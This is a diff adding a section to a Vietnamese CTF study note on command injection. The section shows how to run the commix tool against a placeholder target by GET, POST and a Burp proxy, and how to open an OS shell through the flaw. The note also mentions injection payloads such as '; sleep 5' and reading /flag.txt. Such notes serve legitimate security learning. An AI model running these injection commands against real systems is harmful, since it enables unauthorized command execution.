@@ -48,6 +48,28 @@ if __name__ == "__main__":
 - Vòng `for` thử từng payload, mỗi lần gửi xong kiểm tra `text` (chữ thường hoá của response) có chứa `"uid="` hay `"gid="` không — đây là cách code tự nhận biết "lệnh `id` đã thực sự chạy" mà không cần bạn tự đọc từng response bằng mắt.
 - Khi `return r.text` chạy, hàm dừng lại ngay (không thử tiếp các payload còn lại) vì đã tìm được payload hoạt động — lúc đó bạn đổi `id` trong payload thành lệnh thật cần dùng (ví dụ `cat /flag.txt`, `ls /`) để lấy flag.
 
+## Dùng tool có sẵn `commix` thay vì tự viết tay
+
+Nếu đã nghi command injection mà thử tay 4 payload trên không ra, hoặc muốn tool tự dò kỹ hơn (commix tự thử hàng chục biến thể, tự né 1 số WAF, tự tìm ra kiểu blind bằng time-based nếu cần), dùng `commix` đã có sẵn tại `~/hoc/CTF/Tools/web/commix/`:
+
+```bash
+spwn   # activate venv pwn trước, commix cần python3 + vài thư viện trong venv này
+cd ~/hoc/CTF/Tools/web/commix
+
+# Tham số bị nghi dính ở QUERY STRING (GET) -- đặt ngay trong URL
+python3 commix.py -u "http://target/ping?host=127.0.0.1" --batch
+
+# Tham số bị nghi dính ở BODY (POST form) -- dùng --data, giống data={...} trong requests
+python3 commix.py -u "http://target/ping" --data="host=127.0.0.1" --batch
+
+# Nếu phải gửi qua Burp proxy để debug thêm
+python3 commix.py -u "http://target/ping?host=127.0.0.1" --proxy="http://127.0.0.1:8080" --batch
+```
+
+- `--batch`: không hỏi lại gì cả, tự lấy mặc định cho mọi câu hỏi — bắt buộc có khi chạy không tương tác (không đứng canh màn hình).
+- commix tự thử nhiều kỹ thuật (`results-based`, `blind`, `time-based`) và tự in ra ngay khi tìm thấy dòng kiểu `[+] ... (CVE/technique) injection was found`. Nếu dính, nó hỏi (hoặc tự làm nếu `--batch`) có muốn mở `--os-shell` (shell tương tác chạy lệnh hệ thống qua chính lỗ hổng này) không — gõ `python3 commix.py -u "..." --os-shell` để vào thẳng shell, từ đó gõ lệnh đọc flag (`cat /flag.txt`, `ls /`) như gõ lệnh bình thường trên máy bạn.
+- Nếu không chắc tham số nào dính trong URL dài nhiều tham số, thêm `*` vào đúng vị trí nghi, ví dụ `?host=127.0.0.1*&other=1` — commix chỉ thử vào chỗ có `*`.
+
 ## Lưu ý nhanh
 
 - Nếu không thấy kết quả hiện ngay trong response (gọi là "blind" — mù, không thấy trực tiếp), thử đo thời gian trả lời bằng payload gây chờ, ví dụ `; sleep 5` — nếu response chậm hẳn 5 giây, chứng tỏ lệnh đã chạy dù không thấy output.
